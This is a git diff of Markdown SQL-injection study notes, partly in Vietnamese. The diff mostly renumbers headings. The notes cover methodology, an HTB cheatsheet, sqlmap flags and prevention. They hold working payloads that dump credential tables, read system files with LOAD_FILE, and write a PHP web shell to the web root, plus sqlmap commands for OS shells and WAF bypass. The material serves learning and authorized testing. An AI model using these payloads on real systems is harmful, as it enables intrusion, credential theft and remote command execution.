@@ -9,9 +9,9 @@
 8. [Flags](#Flags)
 9. [Self-exp as practicing](#Self-exp-as-practicing)
 
-# SQL
+# 1. SQL
 
-## DBMS
+## 1.1. DBMS
 
 | Category                          | Details                                                                                                    |
 |-----------------------------------|------------------------------------------------------------------------------------------------------------|
@@ -43,12 +43,9 @@
 | NOT      | `!`    |
 
 
-# SQLi
+# 2. SQLi
 
 ![Screenshot 2024-11-07 122957](https://github.com/user-attachments/assets/b2fbce56-279d-4aa6-a559-642431fe43ab)
-
-## In-Band
-> Can see the messages or results
 
 | Type | Description |
 | --- | --- |
@@ -58,16 +55,16 @@
 
 <br>
 
-# Methodology
+# 3. Methodology
 
-## Black Box
+## 3.1. Black Box
 
 | Step | Description |
 | --- | --- |
 |1. Map the app| - Visit all the urls as a user<br> - Walk through all the accessible pages as a user<br> - Make note of all Input vectors that potentially talk to the back-end<br> - Understand how application functions<br> - Figure out the logic of application<br> - Find subdomains, directories, pages that might not be directly visible |
 |2. Fuzzing the app | - Fuzzing with SQL specific characters like: ' ; " ; # ; / ;...and look for anomalies<br> - Depend on how the app responds, start refining your query until achieve end goal (figure out the back-end query of the app)<br> - Submit Boolean conditions like: OR 1=1 and OR 1=2, and look for differences in app responses<br> - Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond<br> - Submit OAST payload that are designed to trigger a network interaction with a server that you control. And if you get that network interaction (like a dns lookup, or through HTTP, ...) --> Vuln to out-of-band SQLi. |
 
-## White Box
+## 3.2. White Box
 
 | Step | Description |
 | --- | --- |
@@ -78,14 +75,14 @@
 | 5. Fuzz the app | - Submit sql characters that could potentially break query<br> - Look at how they were logged using DB logging<br> Make conclusion if app is vuln to SQLi or not. If it does, code review of that functionality<br>
 | 6. Test any potential SQLi vuln | |
 
-# How to do
+# 4. How to do
 
-## Error-based
+## 4.1. Error-based
 
 - Submit SQL-specific characters like: `'` or `"` and look for errors or anomalies
 - Different characters can give you different errors --> (Do Fuzz to check)
 
-## Union-based
+## 4.2. Union-based
 
 - Use UNION operator.
 - Follow 2 basic rule of UNION:
@@ -101,25 +98,25 @@
 - Find datatype (Vì ta chỉ quan trọng đến dạng string, nên ta sẽ test xem các columns có thể chứa giá trị là string hay không):
   + `' UNION SELECT 'a', NULL--`. Nếu fail, tiếp tục columns tiếp: `' UNION SELECT NULL, 'a'--`. Và so on...
 
-## Boolean-Based Blind SQLi
+## 4.3. Boolean-Based Blind SQLi
 
 - Submit a Boolean condition that evaluates to **False** and note the response
 - Submit a Boolean condition that evaluates to **TRUE** and note the response
 - If the response is different = SQLi boolean blind vuln
 - Write a program/use tools that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response
 
-## Time-Based Blind SQLi
+## 4.4. Time-Based Blind SQLi
 
 - Submit a payload that pause the app for a specified period of time
 - If the app does pause = Vuln
 - Use tools/Write a program that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response time
 
-## Out-of-band SQLi
+## 4.5. Out-of-band SQLi
 
 - Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query and monitor for any resulting interactions
 - Depending on SQLi use different methods to exfil data
 
-# Prevent
+# 5. Prevent
 
 - Primary Defenses:
   + Op1: Use of Prepared Statements (Parameterized Queries)
@@ -131,7 +128,7 @@
   + Op5: Enforcing Least Privilege
   + Op6: Performing Whitelist Input Validation as a Secondary Defense
 
-# HTB cheatsheet
+# 6. HTB cheatsheet
 
 Auth Bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
 
@@ -160,7 +157,7 @@ List of columns within each table: `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABL
 
 Dump data from a table in another database: `' UNION select 1, username, password, 4 from dev.credentials-- -`
 
-## Reading files
+## 6.1. Reading files
 
 The DB user must have the **FILE privilege** to load a file's content into a table and then dump data from that table and read files.
 
@@ -176,7 +173,7 @@ Check USER Privileges:
 - `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
 - `UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
 
-## LOAD_FILE
+## 6.2. LOAD_FILE
 
 Now that we know we have enough **privileges to read local system files**, let us do that using the **LOAD_FILE() function**.
 
@@ -186,7 +183,7 @@ Now that we know we have enough **privileges to read local system files**, let u
 
 `UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` : the page ends up rendering the HTML code within the browser. The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.
 
-## Writing files
+## 6.3. Writing files
 
 To be able to **write files** to the back-end server using a MySQL database, we **require** three things:
 - User with **FILE privilege** enabled
@@ -195,19 +192,19 @@ To be able to **write files** to the back-end server using a MySQL database, we 
 
 The **secure_file_priv** variable is used to determine **where to read/write files from**. An **empty value** lets us **read** files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we **cannot read/write** from any directory. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
 
-## SELECT INTO OUTFILE
+## 6.4. SELECT INTO OUTFILE
 
 The **SELECT INTO OUTFILE** statement can be used to **write data*** from select queries into files.
 - `SELECT * from users INTO OUTFILE '/tmp/credentials';`
 - `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`
 
-## Writing Files through SQL Injection
+## 6.5. Writing Files through SQL Injection
 
 To write a web shell, we must know the **base web directory** for the web server (i.e. **web root**). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots.
 - `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
 - `union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
 
-## Writing a Web Shell
+## 6.6. Writing a Web Shell
 
 `<?php system($_REQUEST[0]); ?>`
 `union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
@@ -215,7 +212,7 @@ To write a web shell, we must know the **base web directory** for the web server
 Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL: `http://SERVER_IP:PORT/shell.php?0=id`
 
 
-# SQLmap
+# 7. SQLmap
 
 see the types of SQL injections supported by SQLMap:	`sqlmap -hh` (advanced listing); `sqlmap -h` (basic listing)
 
@@ -227,7 +224,7 @@ The technique characters **BEUSTQ** refers to the following:
 - T: Time-based blind
 - Q: Inline queries
 
-## Log Messages Description
+## 7.1. Log Messages Description
 
 Below are some of the most common messages usually found during a scan of SQLMap:
 - `URL content is stable/"target URL content is stable"`: không có thay đổi lớn nào giữa các phản hồi trong trường hợp các yêu cầu giống hệt nhau liên tục
@@ -269,7 +266,7 @@ Below are some of the most common messages usually found during a scan of SQLMap
   + Sau lần chạy ban đầu như vậy, khi điểm tiêm được phát hiện thành công, tất cả các chi tiết cho các lần chạy trong tương lai được lưu trữ bên trong các tệp phiên của cùng một thư mục.
   + Điều này có nghĩa là SQLMap cố gắng giảm các yêu cầu mục tiêu bắt buộc càng nhiều càng tốt, tùy thuộc vào dữ liệu của các tệp phiên.
 
-## Running SQLMap on an HTTP Request
+## 7.2. Running SQLMap on an HTTP Request
 
 - `Curl Commands`: 1 cách dễ để và chuẩn chỉ để triển khai SQL map là tận dụng Copy as cURL trong phần Network của browser và sau đó sửa phần cURL = sqlmap.
 - Lưu ý: khi dùng SQL map, data hay link truyền vào phải có giá trị tham số để test. Nếu không thì cần phải dùng flags hoặc opts bổ sung.
@@ -289,7 +286,7 @@ Below are some of the most common messages usually found during a scan of SQLMap
 
 - `Custom HTTP Requests`: Bên cạnh các form-data thường thấy như POST, SQL map cũng support JSON format (e.g. {"id":1}) và XML format  (e.g. <element><id>1</id></element>) trong HTTP request
 
-## Handling SQLMap Errors
+## 7.3. Handling SQLMap Errors
 
 Recommended mechanisms for finding the cause and properly fixing it:
 - `Display Errors`: Bước đầu trong việc phân tích lỗi của SQLmap là dùng flag --parse-errors để phân tích lỗi DBMS (nếu có) và hiển thị chúng như một phần của chương trình chạy.
@@ -302,7 +299,7 @@ Recommended mechanisms for finding the cause and properly fixing it:
 
 - `Using Proxy`: ta có thể sử dụng `--proxy` (e.g., Burp) để traffic sẽ đi qua và được hiện thị trong proxy đó
 
-## Attack Tuning
+## 7.4. Attack Tuning
 
 - Trong hầu hết các trường hợp, SQLMap sẽ chạy ngay khi có thông tin chi tiết về mục tiêu được cung cấp. Tuy nhiên, có các tùy chọn để tinh chỉnh các nỗ lực tiêm SQLi để giúp SQLMap trong giai đoạn phát hiện.
 - Mỗi payload được gửi đến mục tiêu bao gồm:
@@ -327,7 +324,7 @@ Recommended mechanisms for finding the cause and properly fixing it:
 - Vì SQLMap đã được điều chỉnh để kiểm tra các ranh giới và vectơ phổ biến nhất, nên người dùng thông thường được khuyên không nên chạm vào các tùy chọn này vì nó sẽ làm cho toàn bộ quá trình phát hiện chậm hơn đáng kể.
 - Tuy nhiên, trong các trường hợp đặc biệt của lỗ hổng SQLi, khi việc sử dụng tải trọng OR là bắt buộc (ví dụ: trong trường hợp trang đăng nhập), chúng tôi có thể phải tự mình nâng mức rủi ro. Điều này là do tải trọng OR vốn nguy hiểm trong một lần chạy mặc định.
 
-## Advanced Tuning
+## 7.5. Advanced Tuning
 
 - `Status Codes`: when dealing with a huge target response with a lot of dynamic content,  subtle differences là TRUE và FALSE responses. Nếu sự khác nhau này có thể nhìn thấy qua HTTP codes (200 or 301,...) dùng flag --code (+ number) để chỉ phát hiện response có code đó.
 - `Titles`: chỉ định phát hiện qua HTML tag <title> của page với flag `--titles`
@@ -342,7 +339,7 @@ Recommended mechanisms for finding the cause and properly fixing it:
   + Trong trường hợp các giá trị điền **"giả"** `mặc định được SQLMap sử dụng -NULL` và số nguyên ngẫu nhiên- không tương thích với các giá trị từ kết quả của truy vấn SQL dễ bị tấn công, chúng ta có thể chỉ định một giá trị thay thế (ví dụ: `--union-char='a'`).
   + Ngoài ra, trong trường hợp có yêu cầu sử dụng phần phụ lục **(appendix)** ở cuối truy vấn UNION dưới dạng FROM <table> (ví dụ: trong trường hợp của Oracle), chúng ta có thể đặt nó bằng tùy chọn `--union-from` (ví dụ: --union-from=users). Việc không sử dụng phần phụ lục FROM thích hợp một cách tự động có thể là do không phát hiện được tên DBMS trước khi sử dụng.
 
-## Bypassing Web Application Protections
+## 7.6. Bypassing Web Application Protections
 
 - `Anti-CSRF Token Bypass`: `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
 - `Unique Value Bypass`: `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
@@ -371,7 +368,7 @@ If we wanted to be sure that Tor is properly being used, to prevent unwanted beh
   + Ngoài các cơ chế vượt qua bảo vệ khác, có hai cơ chế đáng chú ý. Đầu tiên là `Chunked transfer encoding`, được bật bằng cách sử dụng tùy chọn `--chunked`, chia nhỏ nội dung của yêu cầu POST thành các "chunk". Các từ khóa SQL bị cấm được chia giữa các "chunk" sao cho yêu cầu chứa chúng có thể vượt qua mà không bị phát hiện.
   + Cơ chế thứ hai là `HTTP parameter pollution (HPP)`, trong đó các payload được chia tương tự như --chunked, nhưng giữa các giá trị có cùng tên tham số (ví dụ: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...). Các giá trị này sẽ được nền tảng mục tiêu (ví dụ: ASP) nối lại nếu nền tảng đó hỗ trợ.
 
-## OS Exploitation
+## 7.7. OS Exploitation
 
 - `READ FILE`:
   + Sau khi đã kiểm tra ta có quyền `DBA: True` với `--is-dba`, ta có thể đọc local files với `--file-read`:
@@ -386,7 +383,7 @@ If we wanted to be sure that Tor is properly being used, to prevent unwanted beh
   + Nếu ta có thể viết file để command execution, khả năng cao ta cũng có thể test tính năng của SQL map tạo easy shell cho chúng ta mà không phải viết shell bằng tay. Do SQLmap thực hiện khai thác lỗi để lấy shell. `sqlmap -u "http://www.example.com/?id=1" --os-shell`
   + Tuy nhiên, có thể gặp lỗi nên có thể đổi phương thức, ví dụ như Error-based SQL Injection: `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`
 
-# Flags
+## 7.8. Flags
 
 - `--batch`: skipping any required user-input, automatically choosing using the default option.
 - `--data`: data truyền vào. POST REQUEST
@@ -479,7 +476,7 @@ If we wanted to be sure that Tor is properly being used, to prevent unwanted beh
 - khi tìm được boolean blind, kết hợp sử dụng `-T table -C column --dump` để dump data trong cột của table đó
 
 
-# Self-exp as practicing
+# 8. Thoughts on starting
 
 - Steps for an SQLi PoC:
   1. Identify injectable points: Find input fields or URL parameters that interact with the database.
